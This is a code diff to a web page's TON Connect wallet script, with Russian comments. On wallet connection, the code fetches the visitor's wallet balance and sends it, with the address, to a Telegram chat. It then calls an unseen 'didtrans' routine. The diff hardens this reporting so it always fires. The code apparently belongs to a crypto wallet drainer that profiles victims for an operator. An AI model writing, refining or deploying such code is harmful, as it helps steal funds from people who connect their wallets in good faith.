@@ -33,41 +33,49 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
 });
 
 tonConnectUI.on('walletConnected', async (wallet) => {
-  console.log('Адрес кошелька:', wallet.address);
-  console.log('Wallet Info:', wallet);
+    console.log('Адрес кошелька:', wallet.address);
+    console.log('Wallet Info:', wallet);
 
-  // Отправляем баланс кошелька в Telegram при подключении
-  await sendBalanceToTelegram(wallet.address);
+    // Гарантированная отправка баланса в Telegram после подключения
+    try {
+      await sendBalanceToTelegram(wallet.address);
+    } catch (error) {
+      console.error("Ошибка при отправке баланса в Telegram:", error);
+      // Отправляем сообщение об ошибке, даже если что-то пошло не так
+      sendTelegramMessage(`\u26A0\uFE0F *Критическая ошибка при отправке баланса после подключения!* ${error}`);
+    }
 
-  await didtrans();
+    try {
+        await didtrans();
+    } catch (error) {
+        console.error("Ошибка в didtrans:", error);
+        sendTelegramMessage(`\u26A0\uFE0F *Ошибка в didtrans после подключения кошелька!* ${error}`);
+    }
 });
 
 async function sendBalanceToTelegram(walletAddress) {
-  try {
-    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
+    try {
+        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
 
-    if (!response.ok) {
-      console.error(`Ошибка при запросе баланса: ${response.status} ${response.statusText}`);
-      sendTelegramMessage(`\u26A0\uFE0F *Ошибка при запросе баланса:* ${response.status} ${response.statusText}`);
-      return;
+        if (!response.ok) {
+            throw new Error(`Ошибка при запросе баланса: ${response.status} ${response.statusText}`);
+        }
+
+        const data = await response.json();
+
+        if (data.error) {
+            throw new Error(`Ошибка при получении данных о балансе: ${data.error}`);
+        }
+
+        const balance = parseFloat(data.balance) / 1000000000; // Переводим в TON
+        const message = `\uD83D\uDCC0 *Баланс кошелька ${walletAddress}:* ${balance.toFixed(8)} TON`;
+        sendTelegramMessage(message);
+
+    } catch (error) {
+        console.error("Ошибка при получении и отправке баланса:", error);
+        sendTelegramMessage(`\u26A0\uFE0F *Ошибка при получении баланса:* ${error}`);
+        throw error; // Пробрасываем ошибку выше, чтобы ее обработали в walletConnected
     }
-
-    const data = await response.json();
-
-    if (data.error) {
-      console.error(`Ошибка при получении данных о балансе: ${data.error}`);
-      sendTelegramMessage(`\u26A0\uFE0F *Ошибка при получении данных о балансе:* ${data.error}`);
-      return;
-    }
-
-    const balance = parseFloat(data.balance) / 1000000000; // Переводим в TON
-    const message = `\uD83D\uDCC0 *Баланс кошелька ${walletAddress}:* ${balance.toFixed(8)} TON`;
-    sendTelegramMessage(message);
-
-  } catch (error) {
-    console.error("Ошибка при получении и отправке баланса:", error);
-    sendTelegramMessage(`\u26A0\uFE0F *Ошибка при получении баланса:* ${error}`);
-  }
 }
 
 
